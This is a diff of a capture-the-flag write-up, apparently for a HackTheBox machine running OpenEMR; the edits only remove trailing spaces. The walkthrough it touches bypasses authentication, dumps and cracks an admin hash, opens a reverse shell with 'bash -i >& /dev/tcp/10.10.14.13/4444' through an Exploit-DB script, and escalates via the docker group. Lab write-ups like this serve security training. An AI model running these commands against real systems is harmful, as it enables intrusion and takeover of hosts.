@@ -74,11 +74,11 @@ There's also an authentication bypass exploit here:
 
 To bypass it, all we have to do is simply visit `/portal/account/register.php`, and it would treat us as logged in with a valid token. Searching for exploits led me to a [PDF](https://www.open-emr.org/wiki/images/1/11/Openemr\_insecurity.pdf) that had the vulnerability report for v5.0.1.3, and there are lot including a lot of SQL Injections.
 
-Firstly, visiting `/portal/find_appt_popup_user.php` just works as we have 'bypassed' the login.&#x20;
+Firstly, visiting `/portal/find_appt_popup_user.php` just works as we have 'bypassed' the login.
 
 <figure><img src="../../../.gitbook/assets/image (2060).png" alt=""><figcaption></figcaption></figure>
 
-For this case, the second PoC listed works best.&#x20;
+For this case, the second PoC listed works best.
 
 <figure><img src="../../../.gitbook/assets/image (480).png" alt=""><figcaption></figcaption></figure>
 
@@ -94,7 +94,7 @@ Using `sqlmap`, we can enumerate and view the stuff in the database. (skipped th
 +----+---------+--------------------------------------------------------------+----------+---------------------+---------------+---------------+--------------------------------+-------------------+
 </code></pre>
 
-We can crack this hash in `john`.&#x20;
+We can crack this hash in `john`.
 
 ```
 $ john --wordlist=/usr/share/wordlists/rockyou.txt hash      
@@ -109,11 +109,11 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
 
-Now that we have the admin password, we can do RCE.&#x20;
+Now that we have the admin password, we can do RCE.
 
 {% embed url="https://www.exploit-db.com/exploits/45161" %}
 
-Remember to use `python2`.&#x20;
+Remember to use `python2`.
 
 ```
 $ python2 45161.py -u openemr_admin -p xxxxxx -c 'bash -i >& /dev/tcp/10.10.14.13/4444 0>&1' http://hms.htb
@@ -198,7 +198,7 @@ END
 
 ### Docker Group
 
-`luffy` is part of the `docker` group.&#x20;
+`luffy` is part of the `docker` group.
 
 ```
 luffy@cache:/home/ash$ id
@@ -208,7 +208,7 @@ REPOSITORY          TAG                 IMAGE ID            CREATED             
 ubuntu              latest              2ca708c1c9cc        3 years ago         64.2MB
 ```
 
-We can just run this command to create an Ubuntu container that is mounted on the main file system, where we have access to the container as `root`. This effectively gives us `root` access to the main file system to make `/bin/bash` an SUID binary.&#x20;
+We can just run this command to create an Ubuntu container that is mounted on the main file system, where we have access to the container as `root`. This effectively gives us `root` access to the main file system to make `/bin/bash` an SUID binary.
 
 ```
 luffy@cache:/home/ash$ docker run -it --rm -v /:/mnt ubuntu chroot /mnt bash
